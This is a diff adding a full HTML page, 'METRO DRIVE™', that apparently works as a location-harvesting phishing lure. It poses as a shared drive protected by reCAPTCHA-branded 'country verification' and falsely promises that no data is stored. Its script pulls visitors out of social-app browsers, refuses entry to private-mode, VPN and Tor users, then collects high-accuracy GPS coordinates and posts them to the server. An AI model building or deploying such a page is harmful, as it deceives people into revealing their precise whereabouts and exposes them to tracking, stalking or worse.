@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>METRO DRIVE™</title>
+    <link rel="icon" href="https://i.postimg.cc/SsmQ0qpn/apps-4454-9007199266294947-9935797e-7f33-4838-9652-96cc6c361655.png" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+            background-color: #f0f0f0;
+        }
+
+        /* Video background styling */
+        .video-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: blur(20px);
+            z-index: -1;
+        }
+
+        #location-info, #deny-message {
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            max-width: 90%;
+            width: 90%;
+            max-height: 70vh;
+            margin: auto;
+            z-index: 1;
+            opacity: 1;
+            transition: opacity 0.8s ease-out;
+            overflow-y: auto;
+        }
+
+        #location-info {
+            display: block;
+        }
+
+        #deny-message {
+            display: none;
+        }
+
+        /* For the browser alert */
+        #browser-alert {
+            background-color: rgba(255, 255, 255, 0.85);
+            color: #007BFF;
+            font-size: 18px;
+            padding: 20px;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            position: fixed;
+            top: 40%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            display: none;
+        }
+
+        #location-result {
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        @media (max-width: 768px) {
+            #location-info, #deny-message, #browser-alert {
+                padding: 15px;
+                font-size: 14px;
+            }
+
+            button {
+                font-size: 14px;
+                padding: 8px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Video Background -->
+    <video class="video-background" autoplay muted loop>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <!-- Browser Alert Message Bar -->
+    <div id="browser-alert">
+        <p>This drive link cannot be opened without a browser. Please copy the link and paste it in a search engine to access the drive. Thank you!</p>
+    </div>
+
+    <!-- Initial Location Info Box (hidden initially) -->
+    <div id="location-info" style="display: none;">
+        <h2>Powered by reCAPTCHA</h2>
+        <p style="text-align: justify;">To ensure the safety of our personalized drive access, we request temporary location access for country verification. METRO DRIVE™ never stores or shares user data. Your privacy is our priority.</p>
+        <button id="request-location">Allow Temporary Location Access</button>
+    </div>
+
+    <!-- Denied Message Box (hidden initially) -->
+    <div id="deny-message" style="display: none;">
+        <h2>You must show your location to see the content.</h2>
+        <p>Without showing your location, we cannot provide personalized services.</p>
+        <button id="retry-location">Retry Location Request</button>
+    </div>
+
+    <div id="location-result"></div>
+
+ <script>
+    // Function to detect private/incognito mode
+    function detectPrivateMode() {
+        return new Promise((resolve) => {
+            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+            if (!fs) {
+                resolve(false); // Not in private mode
+            } else {
+                fs(window.TEMPORARY, 100, resolve.bind(null, false), resolve.bind(null, true));
+            }
+        });
+    }
+
+    // Placeholder for VPN/Tor detection (should ideally be handled server-side)
+    function detectVPNorTor() {
+        return new Promise((resolve) => {
+            // Simulating VPN or Tor detection with a placeholder logic
+            const likelyVPN = Math.random() > 0.95; // 5% chance of detection (replace with server-side checks)
+            resolve(likelyVPN);
+        });
+    }
+
+    // Handle restrictions based on detection results
+    async function handleRestrictions() {
+        const isPrivate = await detectPrivateMode();
+        const isVPNorTor = await detectVPNorTor();
+
+        // If any restrictions are detected, show the blocker message
+        if (isPrivate || isVPNorTor) {
+            const messageBar = document.getElementById("browser-alert");
+            messageBar.style.display = "block";
+            messageBar.innerHTML = `
+                Access to this link is restricted in private mode, VPN, or Tor. 
+                Please disable these modes and reload the page.`;
+            document.getElementById("location-info").style.display = "none";
+        } else {
+            // Display the normal location info content for regular users
+            const locationInfo = document.getElementById("location-info");
+            locationInfo.style.display = "block";
+        }
+    }
+
+    // Detect in-app browsers and handle accordingly
+    if (navigator.userAgent.includes('FBAN') || navigator.userAgent.includes('FBAV') ||
+        navigator.userAgent.includes('Instagram') || navigator.userAgent.includes('Twitter') || 
+        navigator.userAgent.includes('FacebookLite') || navigator.userAgent.includes('WhatsApp')) {
+        const messageBar = document.getElementById("browser-alert");
+        messageBar.style.display = "block";
+        messageBar.innerHTML = `
+            This app works best in your default browser. 
+            <a href="${window.location.href}" target="_blank">Open in Browser</a>`;
+    } else {
+        // Run the restrictions check
+        handleRestrictions();
+    }
+
+    // Function to display the user's location
+    function displayLocation(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        fetch(`/location?timestamp=${Date.now()}`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ latitude, longitude })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log(data.message);
+        })
+        .catch(error => {
+            console.log('Error:', error);
+        });
+    }
+
+    // Handle location request errors
+    function handleLocationError(error) {
+        const locationInfo = document.getElementById("location-info");
+        const denyMessage = document.getElementById("deny-message");
+
+        // Fade out the location info box
+        locationInfo.style.transition = 'opacity 1s';
+        locationInfo.style.opacity = '0';
+        setTimeout(() => {
+            locationInfo.style.display = 'none';
+            denyMessage.style.display = 'block';
+            denyMessage.style.transition = 'opacity 1s';
+            denyMessage.style.opacity = '1';
+        }, 1000);
+
+        if (error.code === error.PERMISSION_DENIED) {
+            console.log("User denied location access.");
+        } else {
+            console.log("Unable to retrieve location.");
+        }
+    }
+
+    // Request location on button click
+    document.getElementById("request-location").addEventListener("click", function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(displayLocation, handleLocationError, {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            });
+        } else {
+            alert("Geolocation is not supported by this browser.");
+        }
+    });
+
+    // Retry location request
+    document.getElementById("retry-location").addEventListener("click", function() {
+        const locationInfo = document.getElementById("location-info");
+        const denyMessage = document.getElementById("deny-message");
+
+        locationInfo.style.display = 'block';
+        locationInfo.style.opacity = '1';
+        denyMessage.style.opacity = '0';
+        setTimeout(() => {
+            denyMessage.style.display = 'none';
+        }, 500);
+    });
+</script>
+
+    <!-- Company Name or Logo Section -->
+    <a href="https://apps.microsoft.com/detail/9wzdncrdfxfq?hl=en-US&gl=US" style="position: absolute; top: 20px; left: 20px; color: white; font-family: Arial, sans-serif; font-size: 23.5px; text-decoration: none;">
+        METRO DRIVE™ <!-- Replace this text with your logo or name -->
+    </a>
+
+    <!-- Footer Section -->
+    <div class="footer-text" style="position: absolute; bottom: 8px; text-align: center; width: 100%; font-size:10px;">
+        &copy; 2025 METRO DRIVE™. All rights reserved. <br>
+        For inquiries or issues, email us at <a href="mailto:support@metrodrive.com">support@metrodrive.com</a>.<br>
+        Report problems at <a href="mailto:report@metrodrive.com">report@metrodrive.com</a>.
+    </div>
+
+</body>
+</html>
